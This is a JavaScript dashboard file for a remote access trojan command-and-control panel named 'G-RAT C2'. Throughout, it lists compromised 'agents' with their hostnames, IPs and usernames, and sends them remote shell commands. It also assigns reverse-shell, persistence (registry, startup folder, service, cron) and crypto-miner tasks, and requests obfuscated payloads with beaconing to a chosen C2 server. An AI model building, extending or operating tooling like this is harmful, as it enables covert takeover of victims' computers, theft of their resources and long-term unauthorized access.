// Dashboard initialization
document.addEventListener('DOMContentLoaded', function() {
    console.log("Dashboard initialized at " + new Date().toISOString());

    // Initialize Bootstrap tabs with full error handling
    try {
        const triggerTabList = [].slice.call(document.querySelectorAll('[data-bs-toggle="tab"]'));
        triggerTabList.forEach(function(triggerEl) {
            triggerEl.addEventListener('click', function(event) {
                console.log("Tab clicked:", this.getAttribute('href'));
                
                // Update page title
                const pageTitle = document.getElementById('page-title');
                if (pageTitle) {
                    pageTitle.textContent = this.textContent.trim();
                }
                
                // Load page-specific data
                const targetId = this.getAttribute('href').substring(1);
                loadTabContent(targetId);
            });
        });
    } catch (e) {
        console.error("Error initializing tabs:", e);
    }

    // Setup event handlers
    setupEventHandlers();
    
    // Load initial dashboard data
    loadDashboardData();
    
    // Set refresh interval
    setInterval(function() {
        const activeTab = document.querySelector('.tab-pane.active');
        if (activeTab && activeTab.id === 'dashboard') {
            loadDashboardData();
        }
    }, 30000); // Refresh every 30 seconds
});

// Set up event handlers
function setupEventHandlers() {
    // Refresh button
    const refreshBtn = document.getElementById('refreshBtn');
    if (refreshBtn) {
        refreshBtn.addEventListener('click', function() {
            console.log("Refresh button clicked");
            const activeTab = document.querySelector('.tab-pane.active');
            if (activeTab) {
                loadTabContent(activeTab.id);
            }
        });
    }
    
    // Generate payload button
    const generatePayloadBtn = document.getElementById('generatePayloadBtn');
    if (generatePayloadBtn) {
        generatePayloadBtn.addEventListener('click', function() {
            console.log("Generate payload button clicked");
            const payloadModal = document.getElementById('payloadModal');
            if (payloadModal) {
                const modal = new bootstrap.Modal(payloadModal);
                modal.show();
            }
        });
    }
    
    // Task form submission
    const taskForm = document.getElementById('task-form');
    if (taskForm) {
        taskForm.addEventListener('submit', function(e) {
            e.preventDefault();
            console.log("Task form submitted");
            submitTask();
        });
    }
    
    // Task type change
    const taskType = document.getElementById('task-type');
    if (taskType) {
        taskType.addEventListener('change', function() {
            console.log("Task type changed to:", this.value);
            updateTaskArguments();
        });
    }
    
    // Settings form submission
    const settingsForm = document.getElementById('settings-form');
    if (settingsForm) {
        settingsForm.addEventListener('submit', function(e) {
            e.preventDefault();
            console.log("Settings form submitted");
            saveSettings();
        });
    }
    
    // Terminal send button
    const terminalSend = document.getElementById('terminal-send');
    if (terminalSend) {
        terminalSend.addEventListener('click', sendTerminalCommand);
    }
    
    // Terminal input enter key
    const terminalInput = document.getElementById('terminal-input');
    if (terminalInput) {
        terminalInput.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                sendTerminalCommand();
            }
        });
    }
    
    // Generate payload button in modal
    const generatePayloadBtnModal = document.getElementById('generate-payload-btn');
    if (generatePayloadBtnModal) {
        generatePayloadBtnModal.addEventListener('click', generatePayload);
    }
}

// Load content based on tab
function loadTabContent(tabId) {
    console.log("Loading content for tab:", tabId);
    
    switch (tabId) {
        case 'dashboard':
            loadDashboardData();
            break;
        case 'agents':
            loadAgents();
            break;
        case 'tasks':
            loadTasks();
            updateAgentDropdowns();
            break;
        case 'terminal':
            initTerminal();
            updateAgentDropdowns();
            break;
        case 'settings':
            loadSettings();
            break;
        default:
            // Check if it's a plugin tab
            if (tabId.includes('_')) {
                const pluginName = tabId;
                loadPluginData(pluginName);
            }
    }
}

// Load dashboard data
function loadDashboardData() {
    console.log("Loading dashboard data");
    
    // Update agent count
    safeApiCall('/api/agents', 'GET')
        .then(data => {
            console.log("Agents data loaded:", data);
            
            if (!data || !Array.isArray(data)) {
                console.warn("Invalid agents data format");
                return;
            }
            
            const activeAgents = data.filter(agent => agent.online).length;
            
            const activeAgentsEl = document.getElementById('active-agents-count');
            if (activeAgentsEl) {
                activeAgentsEl.textContent = activeAgents;
            }
            
            // Update the world map if exists
            updateWorldMap(data);
            
            // Update OS chart if exists
            updateOsChart(data);
        })
        .catch(error => console.error("Error loading agents:", error));
    
    // Update tasks count
    safeApiCall('/api/tasks', 'GET')
        .then(data => {
            console.log("Tasks data loaded:", data);
            
            if (!data || !Array.isArray(data)) {
                console.warn("Invalid tasks data format");
                return;
            }
            
            const tasksCount = data.length;
            const pendingTasks = data.filter(task => !task.status || task.status === 'pending').length;
            
            const tasksCountEl = document.getElementById('tasks-count');
            if (tasksCountEl) {
                tasksCountEl.textContent = tasksCount - pendingTasks;
            }
            
            const pendingTasksEl = document.getElementById('pending-tasks-count');
            if (pendingTasksEl) {
                pendingTasksEl.textContent = pendingTasks;
            }
            
            // Update activity chart if exists
            updateActivityChart(data);
        })
        .catch(error => console.error("Error loading tasks:", error));
    
    // Update server status
    safeApiCall('/api/server/status', 'GET')
        .then(data => {
            console.log("Server status loaded:", data);
            
            const uptimeEl = document.getElementById('uptime');
            if (uptimeEl) {
                uptimeEl.textContent = secondsToHms(data.uptime || 0);
            }
            
            // Update activity feed
            const activityFeed = document.getElementById('activity-feed');
            if (activityFeed) {
                if (data.recent_activity && Array.isArray(data.recent_activity) && data.recent_activity.length > 0) {
                    activityFeed.innerHTML = '';
                    data.recent_activity.forEach(activity => {
                        const li = document.createElement('li');
                        li.className = 'list-group-item';
                        li.textContent = activity;
                        activityFeed.appendChild(li);
                    });
                }
            }
        })
        .catch(error => console.error("Error loading server status:", error));
}

// Load agents data
function loadAgents() {
    console.log("Loading agents data");
    
    safeApiCall('/api/agents', 'GET')
        .then(data => {
            console.log("Agents data for table:", data);
            
            const tableBody = document.getElementById('agents-table-body');
            if (!tableBody) {
                console.error("Agents table body not found");
                return;
            }
            
            if (!data || !Array.isArray(data) || data.length === 0) {
                tableBody.innerHTML = '<tr><td colspan="10">No agents connected</td></tr>';
                return;
            }
            
            tableBody.innerHTML = '';
            
            data.forEach(agent => {
                const row = document.createElement('tr');
                row.innerHTML = `
                    <td><input type="checkbox" class="agent-checkbox" data-id="${agent.id || ''}"></td>
                    <td>${agent.id ? agent.id.substring(0, 8) + '...' : 'Unknown'}</td>
                    <td>${agent.system_info?.hostname || 'Unknown'}</td>
                    <td>${agent.ip || 'Unknown'}</td>
                    <td>${agent.system_info?.os || 'Unknown'} / ${agent.system_info?.architecture || 'Unknown'}</td>
                    <td>${agent.system_info?.username || 'Unknown'}</td>
                    <td>${agent.first_seen ? new Date(agent.first_seen).toLocaleString() : 'Unknown'}</td>
                    <td>${agent.last_seen ? new Date(agent.last_seen).toLocaleString() : 'Unknown'}</td>
                    <td><span class="badge ${agent.online ? 'bg-success' : 'bg-danger'}">${agent.online ? 'Online' : 'Offline'}</span></td>
                    <td>
                        <div class="btn-group btn-group-sm">
                            <button class="btn btn-primary btn-sm shell-btn" data-id="${agent.id || ''}">Shell</button>
                            <button class="btn btn-info btn-sm info-btn" data-id="${agent.id || ''}">Info</button>
                            <button class="btn btn-danger btn-sm terminate-btn" data-id="${agent.id || ''}">Terminate</button>
                        </div>
                    </td>
                `;
                tableBody.appendChild(row);
            });
            
            // Add event listeners
            document.querySelectorAll('.shell-btn').forEach(btn => {
                btn.addEventListener('click', function() {
                    openTerminalForAgent(this.getAttribute('data-id'));
                });
            });
            
            document.querySelectorAll('.info-btn').forEach(btn => {
                btn.addEventListener('click', function() {
                    showAgentInfo(this.getAttribute('data-id'));
                });
            });
            
            document.querySelectorAll('.terminate-btn').forEach(btn => {
                btn.addEventListener('click', function() {
                    terminateAgent(this.getAttribute('data-id'));
                });
            });
            
            // Check all checkbox
            const checkAll = document.getElementById('check-all');
            if (checkAll) {
                checkAll.addEventListener('change', function() {
                    document.querySelectorAll('.agent-checkbox').forEach(checkbox => {
                        checkbox.checked = this.checked;
                    });
                });
            }
            
            // Select all button
            const selectAllBtn = document.getElementById('select-all-agents');
            if (selectAllBtn) {
                selectAllBtn.addEventListener('click', function() {
                    document.querySelectorAll('.agent-checkbox').forEach(checkbox => {
                        checkbox.checked = true;
                    });
                    if (checkAll) checkAll.checked = true;
                });
            }
            
            // Terminate selected button
            const terminateSelectedBtn = document.getElementById('terminate-selected');
            if (terminateSelectedBtn) {
                terminateSelectedBtn.addEventListener('click', terminateSelectedAgents);
            }
        })
        .catch(error => {
            console.error("Error loading agents:", error);
            const tableBody = document.getElementById('agents-table-body');
            if (tableBody) {
                tableBody.innerHTML = '<tr><td colspan="10">Error loading agents</td></tr>';
            }
        });
}

// Load tasks data
function loadTasks() {
    console.log("Loading tasks data");
    
    safeApiCall('/api/tasks', 'GET')
        .then(data => {
            console.log("Tasks data for table:", data);
            
            const tableBody = document.getElementById('tasks-table-body');
            if (!tableBody) {
                console.error("Tasks table body not found");
                return;
            }
            
            if (!data || !Array.isArray(data) || data.length === 0) {
                tableBody.innerHTML = '<tr><td colspan="7">No tasks found</td></tr>';
                return;
            }
            
            tableBody.innerHTML = '';
            
            data.forEach(task => {
                const row = document.createElement('tr');
                row.innerHTML = `
                    <td>${task.id ? task.id.substring(0, 8) + '...' : 'Unknown'}</td>
                    <td>${task.agent_id ? task.agent_id.substring(0, 8) + '...' : 'All'}</td>
                    <td>${task.type || 'Unknown'}</td>
                    <td>${task.command || ''}</td>
                    <td>${task.create_time ? new Date(task.create_time).toLocaleString() : 'Unknown'}</td>
                    <td><span class="badge ${getStatusBadgeClass(task.status)}">${task.status || 'Pending'}</span></td>
                    <td>
                        <button class="btn btn-sm btn-primary view-result-btn" data-id="${task.id || ''}" ${task.status === 'completed' ? '' : 'disabled'}>View Result</button>
                    </td>
                `;
                tableBody.appendChild(row);
            });
            
            // Add event listeners to view result buttons
            document.querySelectorAll('.view-result-btn').forEach(btn => {
                btn.addEventListener('click', function() {
                    viewTaskResult(this.getAttribute('data-id'));
                });
            });
        })
        .catch(error => {
            console.error("Error loading tasks:", error);
            const tableBody = document.getElementById('tasks-table-body');
            if (tableBody) {
                tableBody.innerHTML = '<tr><td colspan="7">Error loading tasks</td></tr>';
            }
        });
}

// Update agent dropdowns
function updateAgentDropdowns() {
    console.log("Updating agent dropdowns");
    
    safeApiCall('/api/agents', 'GET')
        .then(data => {
            console.log("Agents data for dropdowns:", data);
            
            const agentSelect = document.getElementById('agent-select');
            const terminalAgentSelect = document.getElementById('terminal-agent-select');
            
            if (!agentSelect && !terminalAgentSelect) {
                console.error("No agent dropdowns found");
                return;
            }
            
            if (!data || !Array.isArray(data)) {
                console.warn("Invalid agents data format for dropdowns");
                return;
            }
            
            // Update agent-select dropdown
            if (agentSelect) {
                // Clear existing options except the first one
                while (agentSelect.options.length > 1) {
                    agentSelect.remove(1);
                }
                
                // Add online agents
                data.filter(agent => agent.online).forEach(agent => {
                    const option = document.createElement('option');
                    option.value = agent.id || '';
                    option.textContent = `${agent.system_info?.hostname || 'Unknown'} (${agent.ip || 'Unknown'})`;
                    agentSelect.appendChild(option);
                });
            }
            
            // Update terminal-agent-select dropdown
            if (terminalAgentSelect) {
                // Clear existing options except the first one
                while (terminalAgentSelect.options.length > 1) {
                    terminalAgentSelect.remove(1);
                }
                
                // Add online agents
                data.filter(agent => agent.online).forEach(agent => {
                    const option = document.createElement('option');
                    option.value = agent.id || '';
                    option.textContent = `${agent.system_info?.hostname || 'Unknown'} (${agent.ip || 'Unknown'})`;
                    terminalAgentSelect.appendChild(option);
                });
            }
        })
        .catch(error => console.error("Error updating agent dropdowns:", error));
}

// Convert seconds to hours:minutes:seconds format
function secondsToHms(seconds) {
    const h = Math.floor(seconds / 3600);
    const m = Math.floor((seconds % 3600) / 60);
    const s = Math.floor(seconds % 60);
    
    return [h, m, s].map(v => v < 10 ? "0" + v : v).join(":");
}

// Get status badge class
function getStatusBadgeClass(status) {
    switch(status) {
        case 'completed': return 'bg-success';
        case 'failed': return 'bg-danger';
        case 'running': return 'bg-primary';
        default: return 'bg-warning'; // pending
    }
}

// Initialize terminal
function initTerminal() {
    console.log("Initializing terminal");
    
    const terminal = document.getElementById('terminal-output');
    if (!terminal) {
        console.error("Terminal output element not found");
        return;
    }
    
    terminal.innerHTML = '<span class="terminal-command">G-RAT Terminal v1.0</span>\nType commands to interact with the selected agent.\n\n';
    
    updateAgentDropdowns();
}

// Send terminal command
function sendTerminalCommand() {
    const terminal = document.getElementById('terminal-output');
    const input = document.getElementById('terminal-input');
    const agentSelect = document.getElementById('terminal-agent-select');
    
    if (!terminal || !input || !agentSelect) {
        console.error("Terminal elements not found");
        return;
    }
    
    const command = input.value.trim();
    if (!command) return;
    
    const agentId = agentSelect.value;
    if (!agentId) {
        terminal.innerHTML += '<span class="terminal-error">Error: No agent selected</span>\n';
        terminal.scrollTop = terminal.scrollHeight;
        return;
    }
    
    terminal.innerHTML += `<span class="terminal-command">&gt; ${command}</span>\n`;
    input.value = '';
    
    // Send command to agent
    safeApiCall(`/api/tasks?agent_id=${agentId}`, 'POST', {
        type: 'shell',
        command: command
    })
    .then(data => {
        console.log("Command sent, task created:", data);
        
        const taskId = data.task_id;
        if (!taskId) {
            terminal.innerHTML += '<span class="terminal-error">Error: Failed to create task</span>\n';
            terminal.scrollTop = terminal.scrollHeight;
            return;
        }
        
        // Wait for result
        terminal.innerHTML += `Executing command (Task ID: ${taskId})...\n`;
        
        // Poll for result
        const maxAttempts = 30; // 30 seconds max
        let attempts = 0;
        
        const checkResult = () => {
            safeApiCall(`/api/results?task_id=${taskId}`, 'GET')
                .then(result => {
                    if (result.status === 'completed') {
                        terminal.innerHTML += `${result.output || 'Command executed with no output'}\n`;
                        terminal.scrollTop = terminal.scrollHeight;
                    } else if (result.status === 'failed') {
                        terminal.innerHTML += `<span class="terminal-error">Error: ${result.error || 'Command execution failed'}</span>\n`;
                        terminal.scrollTop = terminal.scrollHeight;
                    } else if (attempts < maxAttempts) {
                        // Still pending, check again
                        attempts++;
                        setTimeout(checkResult, 1000);
                    } else {
                        terminal.innerHTML += `<span class="terminal-error">Error: Command execution timed out</span>\n`;
                        terminal.scrollTop = terminal.scrollHeight;
                    }
                })
                .catch(error => {
                    console.error("Error checking result:", error);
                    terminal.innerHTML += `<span class="terminal-error">Error: Failed to check command result</span>\n`;
                    terminal.scrollTop = terminal.scrollHeight;
                });
        };
        
        // Start polling after a short delay
        setTimeout(checkResult, 1000);
    })
    .catch(error => {
        console.error("Error sending command:", error);
        terminal.innerHTML += `<span class="terminal-error">Error: ${error.message || 'Failed to send command'}</span>\n`;
        terminal.scrollTop = terminal.scrollHeight;
    });
    
    terminal.scrollTop = terminal.scrollHeight;
}

// View task result
function viewTaskResult(taskId) {
    console.log("Viewing task result for:", taskId);
    
    if (!taskId) {
        console.error("No task ID provided");
        return;
    }
    
    safeApiCall(`/api/results?task_id=${taskId}`, 'GET')
        .then(data => {
            console.log("Task result loaded:", data);
            
            const resultOutput = document.getElementById('result-output');
            if (!resultOutput) {
                console.error("Result output element not found");
                return;
            }
            
            resultOutput.textContent = data.output || 'No output available';
            if (data.error) {
                resultOutput.textContent += `\n\nError: ${data.error}`;
            }
            
            const resultModal = new bootstrap.Modal(document.getElementById('resultModal'));
            resultModal.show();
        })
        .catch(error => {
            console.error("Error viewing task result:", error);
            alert(`Failed to load task result: ${error.message || 'Unknown error'}`);
        });
}

// Open terminal for agent
function openTerminalForAgent(agentId) {
    console.log("Opening terminal for agent:", agentId);
    
    if (!agentId) {
        console.error("No agent ID provided");
        return;
    }
    
    // Show terminal tab
    const terminalTab = document.querySelector('a[data-bs-toggle="tab"][href="#terminal"]');
    if (terminalTab) {
        bootstrap.Tab.getOrCreateInstance(terminalTab).show();
        
        // Set the agent in the dropdown
        setTimeout(() => {
            const terminalAgentSelect = document.getElementById('terminal-agent-select');
            if (terminalAgentSelect) {
                terminalAgentSelect.value = agentId;
                
                // Initialize terminal
                initTerminal();
                
                // Focus on input
                const terminalInput = document.getElementById('terminal-input');
                if (terminalInput) {
                    terminalInput.focus();
                }
            }
        }, 300);
    }
}

// Show agent info
function showAgentInfo(agentId) {
    console.log("Showing info for agent:", agentId);
    
    if (!agentId) {
        console.error("No agent ID provided");
        return;
    }
    
    safeApiCall(`/api/agents`, 'GET')
        .then(agents => {
            const agent = agents.find(a => a.id === agentId);
            if (!agent) {
                throw new Error("Agent not found");
            }
            
            const resultOutput = document.getElementById('result-output');
            if (!resultOutput) {
                console.error("Result output element not found");
                return;
            }
            
            // Format system info
            const systemInfo = agent.system_info || {};
            
            resultOutput.innerHTML = `
                <h4>Agent Information</h4>
                <table class="table table-dark table-striped">
                    <tr><td>ID:</td><td>${agent.id || 'Unknown'}</td></tr>
                    <tr><td>Hostname:</td><td>${systemInfo.hostname || 'Unknown'}</td></tr>
                    <tr><td>IP Address:</td><td>${agent.ip || 'Unknown'}</td></tr>
                    <tr><td>OS:</td><td>${systemInfo.os || 'Unknown'}</td></tr>
                    <tr><td>Architecture:</td><td>${systemInfo.architecture || 'Unknown'}</td></tr>
                    <tr><td>Username:</td><td>${systemInfo.username || 'Unknown'}</td></tr>
                    <tr><td>First Seen:</td><td>${agent.first_seen ? new Date(agent.first_seen).toLocaleString() : 'Unknown'}</td></tr>
                    <tr><td>Last Seen:</td><td>${agent.last_seen ? new Date(agent.last_seen).toLocaleString() : 'Unknown'}</td></tr>
                    <tr><td>Status:</td><td>${agent.online ? 'Online' : 'Offline'}</td></tr>
                </table>
                
                <h5>Capabilities</h5>
                <ul>
                    ${agent.capabilities ? agent.capabilities.map(cap => `<li>${cap}</li>`).join('') : '<li>No capabilities reported</li>'}
                </ul>
            `;
            
            const resultModal = new bootstrap.Modal(document.getElementById('resultModal'));
            resultModal.show();
        })
        .catch(error => {
            console.error("Error showing agent info:", error);
            alert(`Failed to load agent info: ${error.message || 'Unknown error'}`);
        });
}

// Terminate agent
function terminateAgent(agentId) {
    console.log("Terminating agent:", agentId);
    
    if (!agentId) {
        console.error("No agent ID provided");
        return;
    }
    
    if (!confirm("Are you sure you want to terminate this agent?")) {
        return;
    }
    
    safeApiCall(`/api/tasks?agent_id=${agentId}`, 'POST', {
        type: 'terminate',
        command: 'exit'
    })
    .then(data => {
        console.log("Terminate task created:", data);
        alert("Termination command sent to agent");
        
        // Reload agents after a delay
        setTimeout(loadAgents, 2000);
    })
    .catch(error => {
        console.error("Error terminating agent:", error);
        alert(`Failed to terminate agent: ${error.message || 'Unknown error'}`);
    });
}

// Terminate selected agents
function terminateSelectedAgents() {
    console.log("Terminating selected agents");
    
    const selectedAgents = [];
    document.querySelectorAll('.agent-checkbox:checked').forEach(checkbox => {
        const agentId = checkbox.getAttribute('data-id');
        if (agentId) {
            selectedAgents.push(agentId);
        }
    });
    
    if (selectedAgents.length === 0) {
        alert("No agents selected");
        return;
    }
    
    if (!confirm(`Are you sure you want to terminate ${selectedAgents.length} agent(s)?`)) {
        return;
    }
    
    let completed = 0;
    let errors = 0;
    
    selectedAgents.forEach(agentId => {
        safeApiCall(`/api/tasks?agent_id=${agentId}`, 'POST', {
            type: 'terminate',
            command: 'exit'
        })
        .then(data => {
            console.log(`Terminate task created for agent ${agentId}:`, data);
            completed++;
            checkIfDone();
        })
        .catch(error => {
            console.error(`Error terminating agent ${agentId}:`, error);
            errors++;
            checkIfDone();
        });
    });
    
    function checkIfDone() {
        if (completed + errors === selectedAgents.length) {
            alert(`Termination commands sent to ${completed} agent(s). ${errors} error(s) occurred.`);
            
            // Reload agents after a delay
            setTimeout(loadAgents, 2000);
        }
    }
}

// Update task arguments
function updateTaskArguments() {
    console.log("Updating task arguments");
    
    const taskType = document.getElementById('task-type');
    const argsContainer = document.getElementById('task-args-container');
    
    if (!taskType || !argsContainer) {
        console.error("Task type or arguments container not found");
        return;
    }
    
    // Clear existing arguments
    argsContainer.innerHTML = '';
    
    // Add type-specific arguments
    switch (taskType.value) {
        case 'reverse_shell':
            argsContainer.innerHTML = `
                <div class="col-md-6">
                    <label for="host" class="form-label">Host</label>
                    <input type="text" class="form-control" id="host" name="host" required>
                </div>
                <div class="col-md-6">
                    <label for="port" class="form-label">Port</label>
                    <input type="number" class="form-control" id="port" name="port" min="1" max="65535" required>
                </div>
            `;
            break;
        case 'persistence':
            argsContainer.innerHTML = `
                <div class="col-md-6">
                    <label for="method" class="form-label">Method</label>
                    <select class="form-select" id="method" name="method">
                        <option value="startup">Startup Folder</option>
                        <option value="registry">Registry</option>
                        <option value="service">Service</option>
                        <option value="cron">Cron Job</option>
                    </select>
                </div>
                <div class="col-md-6">
                    <label for="file-name" class="form-label">File Name (Optional)</label>
                    <input type="text" class="form-control" id="file-name" name="file_name">
                </div>
            `;
            break;
        case 'miner':
            argsContainer.innerHTML = `
                <div class="col-md-4">
                    <label for="pool" class="form-label">Mining Pool</label>
                    <input type="text" class="form-control" id="pool" name="pool" required>
                </div>
                <div class="col-md-4">
                    <label for="wallet" class="form-label">Wallet Address</label>
                    <input type="text" class="form-control" id="wallet" name="wallet" required>
                </div>
                <div class="col-md-4">
                    <label for="threads" class="form-label">Threads</label>
                    <input type="number" class="form-control" id="threads" name="threads" value="2" min="1" max="32">
                </div>
            `;
            break;
        // Additional task types can be added here
    }
}

// Submit a task
function submitTask() {
    console.log("Submitting task");
    
    const agentSelect = document.getElementById('agent-select');
    const taskType = document.getElementById('task-type');
    const taskCommand = document.getElementById('task-command');
    
    if (!agentSelect || !taskType || !taskCommand) {
        console.error("Task form elements not found");
        return;
    }
    
    const agentId = agentSelect.value;
    const type = taskType.value;
    const command = taskCommand.value;
    
    if (!agentId) {
        alert("Please select an agent");
        return;
    }
    
    if (!command) {
        alert("Please enter a command");
        return;
    }
    
    // Collect additional arguments
    const args = {};
    document.querySelectorAll('#task-args-container input, #task-args-container select').forEach(input => {
        if (input.name) {
            args[input.name] = input.value;
        }
    });
    
    safeApiCall(`/api/tasks?agent_id=${agentId}`, 'POST', {
        type: type,
        command: command,
        args: args
    })
    .then(data => {
        console.log("Task created:", data);
        alert(`Task created successfully (ID: ${data.task_id})`);
        
        // Clear form
        taskCommand.value = '';
        document.querySelectorAll('#task-args-container input, #task-args-container select').forEach(input => {
            input.value = '';
        });
        
        // Reload tasks
        loadTasks();
    })
    .catch(error => {
        console.error("Error creating task:", error);
        alert(`Failed to create task: ${error.message || 'Unknown error'}`);
    });
}

// Generate payload
function generatePayload() {
    console.log("Generating payload");
    
    const payloadType = document.getElementById('payload-type');
    const c2Server = document.getElementById('c2-server');
    const beaconInterval = document.getElementById('beacon-interval-payload');
    const persistenceEnabled = document.getElementById('persistence-enabled');
    const obfuscationEnabled = document.getElementById('obfuscation-enabled');
    
    if (!payloadType || !c2Server || !beaconInterval) {
        console.error("Payload form elements not found");
        return;
    }
    
    const payload = {
        type: payloadType.value,
        c2_server: c2Server.value,
        beacon_interval: parseInt(beaconInterval.value) || 60,
        persistence: persistenceEnabled?.checked || false,
        obfuscation: obfuscationEnabled?.checked || false
    };
    
    safeApiCall('/api/payload', 'POST', payload)
        .then(data => {
            console.log("Payload generated:", data);
            
            // Close modal
            bootstrap.Modal.getInstance(document.getElementById('payloadModal')).hide();
            
            // Show download link or instructions
            if (data.download_url) {
                window.location.href = data.download_url;
            } else {
                alert("Payload generated successfully. You can download it from the server.");
            }
        })
        .catch(error => {
            console.error("Error generating payload:", error);
            alert(`Failed to generate payload: ${error.message || 'Unknown error'}`);
        });
}

// Load settings
function loadSettings() {
    console.log("Loading settings");
    
    safeApiCall('/api/settings', 'GET')
        .then(data => {
            console.log("Settings loaded:", data);
            
            const serverNameInput = document.getElementById('server-name');
            const beaconIntervalInput = document.getElementById('beacon-interval');
            const maxAgentsInput = document.getElementById('max-agents');
            const logToFileInput = document.getElementById('log-to-file');
            
            if (serverNameInput) serverNameInput.value = data.server_name || 'G-RAT C2';
            if (beaconIntervalInput) beaconIntervalInput.value = data.beacon_interval || 60;
            if (maxAgentsInput) maxAgentsInput.value = data.max_agents || 100;
            if (logToFileInput) logToFileInput.checked = data.log_to_file || false;
        })
        .catch(error => console.error("Error loading settings:", error));
}

// Save settings
function saveSettings() {
    console.log("Saving settings");
    
    const serverName = document.getElementById('server-name')?.value || 'G-RAT C2';
    const beaconInterval = parseInt(document.getElementById('beacon-interval')?.value) || 60;
    const maxAgents = parseInt(document.getElementById('max-agents')?.value) || 100;
    const logToFile = document.getElementById('log-to-file')?.checked || false;
    
    const settings = {
        server_name: serverName,
        beacon_interval: beaconInterval,
        max_agents: maxAgents,
        log_to_file: logToFile
    };
    
    safeApiCall('/api/settings', 'POST', settings)
        .then(data => {
            console.log("Settings saved:", data);
            alert("Settings saved successfully");
        })
        .catch(error => {
            console.error("Error saving settings:", error);
            alert(`Failed to save settings: ${error.message || 'Unknown error'}`);
        });
}

// Load plugin data
function loadPluginData(pluginName) {
    console.log("Loading plugin data:", pluginName);
    
    safeApiCall(`/api/plugin/${pluginName}`, 'GET')
        .then(data => {
            console.log(`Plugin ${pluginName} data loaded:`, data);
            
            // Plugin-specific UI handling would go here
        })
        .catch(error => console.error(`Error loading plugin ${pluginName} data:`, error));
}

// Update world map with agent locations
function updateWorldMap(agents) {
    // This would be implemented to plot agent locations on a map
    console.log("Updating world map with agents:", agents.length);
    
    // Actual implementation would depend on your mapping library
    const worldMap = document.getElementById('world-map');
    if (!worldMap) return;
    
    // Clear existing markers
    worldMap.querySelectorAll('.agent-marker').forEach(marker => marker.remove());
}

// Update OS chart
function updateOsChart(agents) {
    console.log("Updating OS chart with agents:", agents.length);
    
    const osChartCanvas = document.getElementById('osChart');
    if (!osChartCanvas) return;
    
    // Count agents by OS
    const osCounts = {};
    agents.forEach(agent => {
        const os = agent.system_info?.os || 'Unknown';
        osCounts[os] = (osCounts[os] || 0) + 1;
    });
    
    // Chart.js implementation would go here
    // For this sample, we'll just log the data
    console.log("OS distribution:", osCounts);
}

// Update activity chart
function updateActivityChart(tasks) {
    console.log("Updating activity chart with tasks:", tasks.length);
    
    const activityChartCanvas = document.getElementById('activityChart');
    if (!activityChartCanvas) return;
    
    // Count tasks by date
    const taskCounts = {};
    tasks.forEach(task => {
        if (task.create_time) {
            const date = new Date(task.create_time).toLocaleDateString();
            taskCounts[date] = (taskCounts[date] || 0) + 1;
        }
    });
    
    // Chart.js implementation would go here
    // For this sample, we'll just log the data
    console.log("Activity distribution:", taskCounts);
}

// Safe API call function with error handling
function safeApiCall(url, method = 'GET', body = null) {
    console.log(`API call: ${method} ${url}`, body);
    
    const options = {
        method: method,
        headers: {
            'Content-Type': 'application/json'
        }
    };
    
    if (body) {
        options.body = JSON.stringify(body);
    }
    
    return fetch(url, options)
        .then(response => {
            if (!response.ok) {
                throw new Error(`HTTP error ${response.status}: ${response.statusText}`);
            }
            return response.json();
        })
        .catch(error => {
            console.error(`API error (${method} ${url}):`, error);
            throw error;
        });
}
